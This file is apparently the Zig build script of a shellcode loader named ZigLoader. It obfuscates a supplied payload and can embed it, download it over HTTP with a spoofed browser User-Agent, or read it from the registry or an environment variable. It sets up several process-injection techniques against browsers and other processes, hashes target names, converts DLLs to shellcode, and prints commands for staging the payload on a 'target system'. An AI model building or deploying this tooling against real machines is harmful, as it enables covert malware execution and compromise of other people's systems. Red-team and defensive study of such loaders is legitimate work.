const std = @import("std");
const hashFNV1a = @import("src/helper/hash.zig").hashFNV1a;
const obfsBytes = @import("src/helper/obfs.zig").obfsBytes;
const win32 = @import("src/win32.zig");

const archs = &.{ "x86", "x64", "aarch64" };

fn getCpuArch(arch: []const u8) std.Target.Cpu.Arch {
    if (std.mem.eql(u8, arch, "x86")) return .x86;
    if (std.mem.eql(u8, arch, "x64")) return .x86_64;
    if (std.mem.eql(u8, arch, "aarch64")) return .aarch64;
    @panic("Unsupported architecture");
}

pub fn build(b: *std.Build) void {
    const root_source_file = b.path("src/main.zig");

    // Options
    const arg_payload = b.option([]const u8, "payload", "Path to payload (shellcode)") orelse "";
    const arg_payload_url = b.option([]const u8, "payload_url", "URL to fetch payload at runtime") orelse "";
    const arg_payload_reg_key = b.option([]const u8, "payload_reg_key", "A registry key name in which shellcode is stored") orelse "";
    const arg_payload_reg_value = b.option([]const u8, "payload_reg_value", "A registry value name in which shellcode is stored") orelse "";
    const arg_payload_env = b.option([]const u8, "payload_env", "An environment variable name in which shellcode is stored") orelse "";
    const arg_http_useragent = b.option([]const u8, "ua", "Custom User-Agent") orelse "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
    const arg_http_method = b.option([]const u8, "method", "HTTP request method (default: GET)") orelse "GET";
    const arg_http_headers = b.option([]const u8, "headers", "HTTP request headers") orelse "";
    const arg_http_data = b.option([]const u8, "data", "HTTP request data") orelse "";
    const arg_injection = b.option([]const u8, "injection", "Priority of injection method to perform (default: remote_mapping,local_mapping,callback,earlybird,cascade,classic)") orelse "remote_mapping,local_mapping,callback,earlybird,cascade,classic";
    const arg_process = b.option([]const u8, "process", "Target processes to be injected (default: chrome.exe,msedge.exe,firefox.exe,brave.exe,notepad.exe,conhost.exe)") orelse "chrome.exe,msedge.exe,firefox.exe,brave.exe,notepad.exe,conhost.exe";

    // Check options
    if (std.mem.eql(u8, arg_payload, "")) {
        std.debug.print("[x] Specify the path to your payload e.g. '-Dpayload=./payload.bin'.\n", .{});
        return;
    }

    // Initialize RNG
     var prng = std.Random.DefaultPrng.init(blk: {
        var seed: u64 = undefined;
        std.posix.getrandom(std.mem.asBytes(&seed)) catch return;
        break :blk seed;
    });
    const rand = prng.random();

    // Determin the obfuscation initial state
    const obfs_key = rand.int(u8);

    // Get the payload bytes or URL
    var payload = Payload.init(
        b.allocator,
        arg_payload,
        arg_payload_url,
        arg_payload_reg_key,
        arg_payload_reg_value,
        arg_payload_env,
        arg_http_useragent,
        arg_http_method,
        arg_http_headers,
        arg_http_data,
        obfs_key,
    ) catch |err| {
        std.debug.print("[x] Shellcode.init error: {s}\n", .{ @errorName(err) });
        return;
    };
    defer payload.deinit();

    // Validate the HTTP method
    if (!isValidHttpMethod(arg_http_method)) {
        std.debug.print("[x] Invalid HTTP method: {s}\n", .{ arg_http_method });
        return;
    }

    // Get the injection techniques
    var injection_split = std.mem.tokenizeSequence(u8, arg_injection, ",");
    var injections = std.ArrayList([]const u8).init(b.allocator);
    defer injections.deinit();
    while (injection_split.next()) |token| {
        injections.append(token) catch |err| {
            std.debug.print("[x] injections.append error: {s}\n", .{ @errorName(err) });
            return;
        };
    }

    // Get target process names
    var process_split = std.mem.tokenizeSequence(u8, arg_process, ",");
    var processes = std.ArrayList([]const u8).init(b.allocator);
    defer processes.deinit();
    while (process_split.next()) |token| {
        processes.append(token) catch |err| {
            std.debug.print("[x] processes.append error: {s}\n", .{ @errorName(err) });
            return;
        };
    }

    const exe_step = b.step("exe", "Build EXE.");
    {
        inline for (archs) |arch| {
            const exe = b.addExecutable(.{
                .name = arch,
                .root_source_file = root_source_file,
                .target = b.resolveTargetQuery(.{ .cpu_arch = getCpuArch(arch), .os_tag = .windows, .abi = .msvc }),
                .optimize = .ReleaseSmall,
            });
            addConfigData(b, exe, payload, injections, processes, obfs_key) catch |err| {
                std.debug.print("[x] addConfigData error: {s}\n", .{ @errorName(err) });
                return;
            };
            exe_step.dependOn(&b.addInstallArtifact(exe, .{}).step);
        }
    }

    const dll_step = b.step("dll", "Build DLL.");
    {
        inline for (archs) |arch| {
            const dll = b.addSharedLibrary(.{
                .name = arch,
                .root_source_file = root_source_file,
                .target = b.resolveTargetQuery(.{ .cpu_arch = getCpuArch(arch), .os_tag = .windows, .abi = .msvc }),
                .optimize = .ReleaseSmall,
            });
            addConfigData(b, dll, payload, injections, processes, obfs_key) catch |err| {
                std.debug.print("[x] addConfigData error: {s}\n", .{ @errorName(err) });
                return;
            };
            const install = b.addInstallArtifact(dll, .{});
            const convert_step = DllToShellcode.init(b, install);
            dll_step.dependOn(&convert_step.step);
        }
    }

    b.default_step.dependOn(exe_step);
    b.default_step.dependOn(dll_step);

    // Instructions after build
    if (!std.mem.eql(u8, arg_payload_reg_key, "") and !std.mem.eql(u8, arg_payload_reg_key, "")) {
        const payload_hex = binToHex(b.allocator, payload.bytes_obfs.?) catch return;
        defer b.allocator.free(payload_hex);

        std.debug.print("[i] Before ZigLoader can load the payload, make sure the payload binary (hex encoded) is written to the registry on the target system.\n", .{});
        std.debug.print("[i] Run the following command on the target system:\n\n", .{});
        std.debug.print(
            "```\nreg add \"{s}\" /v \"{s}\" /t REG_BINARY /d {s} /f\n```\n\n",
            .{ arg_payload_reg_key, arg_payload_reg_value, payload_hex },
        );
    } else if (!std.mem.eql(u8, arg_payload_env, "")) {
        const payload_base64 = encodeBase64(b.allocator, payload.bytes_obfs.?[0..]) catch |err| {
            std.debug.print("[x] encodeBase64 failed: {s}\n", .{ @errorName(err) });
            return;
        };
        defer b.allocator.free(payload_base64);

        std.debug.print("[i] Before ZigLoader can load the payload, make sure the payload binary (base64 encoded) is set to the environment variable on the target system.\n", .{});
        std.debug.print("[i] Run the following command on the target system:\n\n", .{});
        std.debug.print(
            "```\n$env:{s} = \"{s}\"\n```\n\n",
            .{ arg_payload_env, payload_base64 },
        );
    }
}

fn isValidHttpMethod(method: []const u8) bool {
    return std.mem.eql(u8, method, "GET") or
        std.mem.eql(u8, method, "POST") or
        std.mem.eql(u8, method, "OPTIONS") or
        std.mem.eql(u8, method, "PUT") or
        std.mem.eql(u8, method, "DELETE") or
        std.mem.eql(u8, method, "HEAD") or
        std.mem.eql(u8, method, "PATCH");
}

fn addConfigData(
    b: *std.Build,
    artifact: *std.Build.Step.Compile,
    payload: Payload,
    injections: std.ArrayList([]const u8),
    processes: std.ArrayList([]const u8),
    obfs_key: u8,
) !void {
    const allocator = b.allocator;

    // Create the config file.
    const tmp_dir = "zig-out/tmp";
    std.fs.cwd().makePath(tmp_dir) catch {};
    const config_path = b.fmt("{s}/config.zig", .{ tmp_dir });
    const file = try std.fs.cwd().createFile(config_path, .{ .truncate = true });
    defer file.close();

    var content = std.ArrayList(u8).init(allocator);
    defer content.deinit();

    // Initial values
    {
        try content.writer().print("pub const obfs_key: u8 = {d};\n", .{ obfs_key });
    }
    // Payload
    {
        try content.writer().print(
            \\pub const PayloadType = enum {{
            \\  Embedded,
            \\  Http,
            \\  Registry,
            \\  Env,
            \\}};
            \\
            ,
            .{},
        );
        if (payload.embedded) |embedded| {
            try content.writer().print("pub const payload_type: PayloadType = PayloadType.Embedded;\n", .{});
            try content.writer().print("pub const payload_obfs: [{d}]u8 = {s};\n", .{ embedded.size, embedded.str });
        } else if (payload.http) |http| {
            try content.writer().print("pub const payload_type: PayloadType = PayloadType.Http;\n", .{});
            try obfuscateStringAndWrite(allocator, &content, http.url, "http_url_obfs", obfs_key);
            try obfuscateStringAndWrite(allocator, &content, http.useragent, "http_useragent_obfs", obfs_key);
            try obfuscateStringAndWrite(allocator, &content, http.method, "http_method_obfs", obfs_key);
            try obfuscateStringAndWrite(allocator, &content, http.headers, "http_headers_obfs", obfs_key);
            try obfuscateStringAndWrite(allocator, &content, http.data, "http_data_obfs", obfs_key);
        } else if (payload.registry) |reg| {
            try content.writer().print("pub const payload_type: PayloadType = PayloadType.Registry;\n", .{});
            try obfuscateStringAndWrite(allocator, &content, reg.key, "reg_key_obfs", obfs_key);
            try obfuscateStringAndWrite(allocator, &content, reg.value, "reg_value_obfs", obfs_key);
        } else if (payload.env) |env| {
            try content.writer().print("pub const payload_type: PayloadType = PayloadType.Env;\n", .{});
            try obfuscateStringAndWrite(allocator, &content, env.name, "env_name_obfs", obfs_key);
        }
    }
    // Injection techniques
    {
        // InjectionType
        try content.writer().print(
            \\pub const InjectionType = enum {{
            \\  Classic,
            \\  EarlyBird,
            \\  Callback,
            \\  LocalMapping,
            \\  RemoteMapping,
            \\  Cascade,
            \\}};
            \\
            ,
            .{},
        );

        // Injection type order
        try content.writer().print("pub const injection_types = [_]InjectionType{{ ", .{});
        for (injections.items) |inj| {
            if (std.mem.eql(u8, inj, "classic")) {
                try content.writer().print("InjectionType.Classic, ", .{});
            } else if (std.mem.eql(u8, inj, "earlybird")) {
                try content.writer().print("InjectionType.EarlyBird, ", .{});
            } else if (std.mem.eql(u8, inj, "callback")) {
                try content.writer().print("InjectionType.Callback, ", .{});
            } else if (std.mem.eql(u8, inj, "local_mapping")) {
                try content.writer().print("InjectionType.LocalMapping, ", .{});
            } else if (std.mem.eql(u8, inj, "remote_mapping")) {
                try content.writer().print("InjectionType.RemoteMapping, ", .{});
            } else if (std.mem.eql(u8, inj, "cascade")) {
                try content.writer().print("InjectionType.Cascade, ", .{});
            } else {
                return error.InvalidInjectionType;
            }
        }
        try content.writer().print("}};\n", .{});
    }
    // Target process names
    {
        // Hashes
        try content.writer().print("pub const target_process_name_hashes = [_]u32{{ ", .{});
        for (processes.items) |proc| try content.writer().print("{d},", .{ hashFNV1a(proc) });
        try content.writer().print(" }};\n", .{});

        // Obfuscate the process name which is used for creating a new process, so use only one name.
        try obfuscateStringAndWrite(allocator, &content, processes.items[0], "target_process_name_obfs", obfs_key);        
    }
    // Other values
    {
        // Hashes
        try content.writer().print("pub const hash_ntdll: u32 = {d};\n", .{ hashFNV1a("ntdll.dll") });

        // Obfuscated strings
        try obfuscateStringAndWrite(allocator, &content, "https", "str_https_obfs", obfs_key);
        try obfuscateStringAndWrite(allocator, &content, "user32.dll", "str_user32_dll_obfs", obfs_key);
        try obfuscateStringAndWrite(allocator, &content, "winhttp.dll", "str_winhttp_dll_obfs", obfs_key);
    }
    // Write all to the config file
    try file.writeAll(try content.toOwnedSlice());

    // Add import
    artifact.root_module.addAnonymousImport("config", .{
        .root_source_file = b.path(config_path),
    });

}

fn obfuscateStringAndWrite(
    allocator: std.mem.Allocator,
    content: *std.ArrayList(u8),
    str: []const u8,
    identifier: []const u8,
    obfs_key: u8,
) !void {
    const str_obfs = try allocator.alloc(u8, str.len);
    defer allocator.free(str_obfs);
    obfsBytes(str_obfs, str, obfs_key);
    const str_obfs_fmt = try formatBytes(allocator, str_obfs);
    defer allocator.free(str_obfs_fmt);
    try content.writer().print("pub const {s}: [{d}]u8 = {s};\n", .{ identifier, str.len, str_obfs_fmt });
}

const Embedded = struct {
    bytes_obfs: []u8,
    size: usize,
    str: []const u8,
};

const Http = struct {
    url: []const u8,
    useragent: []const u8,
    method: []const u8,
    headers: []const u8,
    data: []const u8,
};

const Registry = struct {
    key: []const u8,
    value: []const u8,
};

const Env = struct {
    name: []const u8,
};

const Payload = struct {
    allocator: std.mem.Allocator,
    bytes_obfs: ?[]u8,

    embedded: ?Embedded,
    http: ?Http,
    registry: ?Registry,
    env: ?Env,

    const Self = @This();

    fn init(
        allocator: std.mem.Allocator,
        payload_path: []const u8,
        payload_url: []const u8,
        payload_reg_key: []const u8,
        payload_reg_value: []const u8,
        payload_env: []const u8,
        useragent: []const u8,
        http_method: []const u8,
        http_headers: []const u8,
        http_data: []const u8,
        obfs_key: u8,
    ) !Self {
        var self = Self{
            .allocator = allocator,
            .bytes_obfs = null,
            .embedded = null,
            .http = null,
            .registry = null,
            .env = null,
        };

        const payload_name = std.fs.path.basename(payload_path);

        const bytes = try self.read(payload_path);
        defer self.allocator.free(bytes);
        
        // Obfuscate
        const bytes_obfs = try allocator.alloc(u8, bytes.len);
        obfsBytes(bytes_obfs, bytes, obfs_key);
        self.bytes_obfs = bytes_obfs;

        // Output the obfuscated payload
        try self.write(payload_name, bytes_obfs);

        if (std.mem.eql(u8, payload_url, "") and std.mem.eql(u8, payload_reg_key, "") and std.mem.eql(u8, payload_env, "")) {
            // Embed type
            self.embedded = Embedded{
                .bytes_obfs = bytes_obfs,
                .size = bytes_obfs.len,
                .str = try formatBytes(self.allocator, bytes_obfs),
            };
        } else if (!std.mem.eql(u8, payload_url, "") and std.mem.eql(u8, payload_reg_key, "") and std.mem.eql(u8, payload_env, "")) {
            // Download (HTTP) type
            self.http = Http{
                .url = payload_url,
                .useragent = useragent,
                .method = http_method,
                .headers = http_headers,
                .data = http_data,
            };
        } else if (std.mem.eql(u8, payload_url, "") and !std.mem.eql(u8, payload_reg_key, "") and std.mem.eql(u8, payload_env, "")) {
            // Registry type
            self.registry = Registry{
                .key = payload_reg_key,
                .value = payload_reg_value,
            };
        } else if (std.mem.eql(u8, payload_url, "") and std.mem.eql(u8, payload_reg_key, "") and !std.mem.eql(u8, payload_env, "")) {
            // Environment variable
            self.env = Env{
                .name = payload_env,
            };
        } else {
            return error.InvalidPayloadOptions;
        }

        return self;
    }

    fn read(self: *Self, payload_path: []const u8) ![]u8 {
        const file = try std.fs.cwd().openFile(payload_path, .{});
        defer file.close();
        const stat = try file.stat();
        const size = stat.size;
        const bytes = try file.readToEndAlloc(self.allocator, size);
        return bytes;
    }

    fn write(self: *Self, payload_name: []const u8, bytes_obfs: []u8) !void {
        // Create the payload file.
        const payload_dir = "zig-out/payload";
        std.fs.cwd().makePath(payload_dir) catch {};
        const payload_path = try std.fmt.allocPrint(self.allocator, "{s}/obfuscated-{s}", .{ payload_dir, payload_name });
        const file = try std.fs.cwd().createFile(payload_path, .{ .truncate = true });
        defer file.close();

        try file.writeAll(bytes_obfs);
    }

    fn deinit(self: *Self) void {
        if (self.embedded) |embedded| {
            self.allocator.free(embedded.bytes_obfs);
            self.allocator.free(embedded.str);
        }
    }
};

fn formatBytes(allocator: std.mem.Allocator, bytes: []const u8) ![]u8 {
    var al = std.ArrayList(u8).init(allocator);
    defer al.deinit();

    try al.appendSlice(".{ ");
    for (bytes, 0..) |b, i| {
        if (i != 0) try al.appendSlice(", ");
        const hexStr = try std.fmt.allocPrint(allocator, "0x{X}", .{b});
        defer allocator.free(hexStr);
        try al.appendSlice(hexStr);
    }
    try al.appendSlice(" }");

    return al.toOwnedSlice();
}

const DllToShellcode = struct {
    step: std.Build.Step,
    install: *std.Build.Step.InstallArtifact,

    const Self = @This();

    fn init(owner: *std.Build, install: *std.Build.Step.InstallArtifact) *Self {
        const self = owner.allocator.create(Self) catch unreachable;

        self.* = .{
            .step = std.Build.Step.init(.{
                .id = .install_artifact,
                .name = owner.fmt("Convert '{s}' to shellcode", .{ install.artifact.name }),
                .owner = owner,
                .makeFn = convert,
            }),
            .install = install,
        };
        self.step.dependOn(&install.step);
        return self;
    }
};

fn convert(step: *std.Build.Step, make_options: std.Build.Step.MakeOptions) anyerror!void {
    _ = make_options;
    const c: *DllToShellcode = @fieldParentPtr("step", step);

    const dll_path = step.owner.fmt(
        "{s}/bin/{s}",
        .{ step.owner.install_path, c.install.dest_sub_path },
    );
    
    const result = std.process.Child.run(.{
        .allocator = step.owner.allocator,
        .argv = &[_][]const u8{
            "python3",
            "sRDI/ConvertToShellcode.py",
            dll_path,
        },
    }) catch |err| {
        std.debug.print("[x] Failed to run ConvertToShellcode.py: {s}\n", .{@errorName(err)});
        return err;
    };
    defer step.owner.allocator.free(result.stdout);
    defer step.owner.allocator.free(result.stderr);
    
    if (result.term.Exited != 0) {
        std.debug.print("[x] ConvertToShellcode.py failed with exit code: {}\n", .{result.term.Exited});
        std.debug.print("stderr: {s}\n", .{result.stderr});
        return error.ConversionFailed;
    }
}

fn binToHex(allocator: std.mem.Allocator, input: []const u8) ![]u8 {
    const hex_chars = "0123456789abcdef";
    var out = try allocator.alloc(u8, input.len * 2);
    for (input, 0..) |byte, i| {
        out[i * 2]     = hex_chars[(byte >> 4) & 0xF];
        out[i * 2 + 1] = hex_chars[byte & 0xF];
    }
    return out;
}

fn encodeBase64(allocator: std.mem.Allocator, input: []const u8) ![]u8 {
    const encoder = std.base64.standard.Encoder;    
    const encoded_len = encoder.calcSize(input.len);    
    const result = try allocator.alloc(u8, encoded_len);    
    return @constCast(encoder.encode(result, input));
}